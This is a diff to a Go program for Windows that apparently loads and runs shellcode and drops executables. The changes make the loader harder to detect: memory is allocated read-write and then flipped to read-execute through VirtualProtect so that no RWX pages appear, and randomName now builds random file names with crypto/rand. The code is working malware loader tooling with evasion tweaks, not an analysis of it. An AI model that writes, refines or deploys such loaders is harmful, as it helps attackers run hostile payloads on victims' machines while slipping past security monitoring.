@@ -3,9 +3,11 @@
 package main
 
 import (
+	"crypto/rand"
 	"fmt"
 	"os"
 	"path/filepath"
+	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -31,14 +33,13 @@ var (
 )
 
 const (
-	memCommit        uintptr = 0x1000
-	memReserve       uintptr = 0x2000
-	memRelease       uintptr = 0x8000
-	pageRWX          uintptr = 0x40
-	pageRW           uintptr = 0x04
-	createSuspended  uint32  = 0x00000004
-	infinite         uint32  = 0xFFFFFFFF
-	threadAllAccess  uintptr = 0x001F03FF
+	memCommit       uintptr = 0x1000
+	memReserve      uintptr = 0x2000
+	memRelease      uintptr = 0x8000
+	pageRW          uintptr = 0x04
+	createSuspended uint32  = 0x00000004
+	infinite        uint32  = 0xFFFFFFFF
+	threadAllAccess uintptr = 0x001F03FF
 )
 
 // execute dispatches to the configured execution method.
@@ -53,24 +54,40 @@ func execute(payload []byte) error {
 	}
 }
 
-// execThread allocates RWX memory and runs the shellcode in a new thread.
-// Payload must be position-independent shellcode.
+// execThread allocates RW memory, writes shellcode, then flips to RX before
+// creating the thread — W^X discipline, no RWX pages.
 func execThread(sc []byte) error {
 	if len(sc) == 0 {
 		return fmt.Errorf("empty shellcode")
 	}
 
+	// Allocate RW (not RWX)
 	addr, _, err := procVirtualAlloc.Call(
 		0,
 		uintptr(len(sc)),
 		memCommit|memReserve,
-		pageRWX,
+		pageRW,
 	)
 	if addr == 0 {
 		return fmt.Errorf("VirtualAlloc: %v", err)
 	}
 
+	// Write shellcode while page is writable
 	procRtlCopyMem.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
+
+	// Flip RW → RX before execution
+	const pageRX uintptr = 0x20
+	var oldProt uint32
+	ret, _, e := procVirtualProtectEx.Call(
+		^uintptr(0), // current process pseudo-handle
+		addr,
+		uintptr(len(sc)),
+		pageRX,
+		uintptr(unsafe.Pointer(&oldProt)),
+	)
+	if ret == 0 {
+		return fmt.Errorf("VirtualProtect RX: %v", e)
+	}
 
 	tid := uint32(0)
 	h, _, err := procCreateThread.Call(
@@ -234,11 +251,20 @@ func execDrop(pe []byte) error {
 
 func randomName() string {
 	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
-	b := make([]byte, 8)
-	for i := range b {
-		b[i] = chars[os.Getpid()%len(chars)]
+	buf := make([]byte, 8)
+	if _, err := rand.Read(buf); err != nil {
+		// fallback: mix pid + time bytes
+		t := time.Now().UnixNano()
+		p := int64(os.Getpid())
+		for i := range buf {
+			buf[i] = byte((t ^ (p << uint(i*7))) & 0xFF)
+		}
 	}
-	return string(b)
+	out := make([]byte, 8)
+	for i, v := range buf {
+		out[i] = chars[int(v)%len(chars)]
+	}
+	return string(out)
 }
 
 // ── minimal context wrapper ───────────────────────────────────────────────────
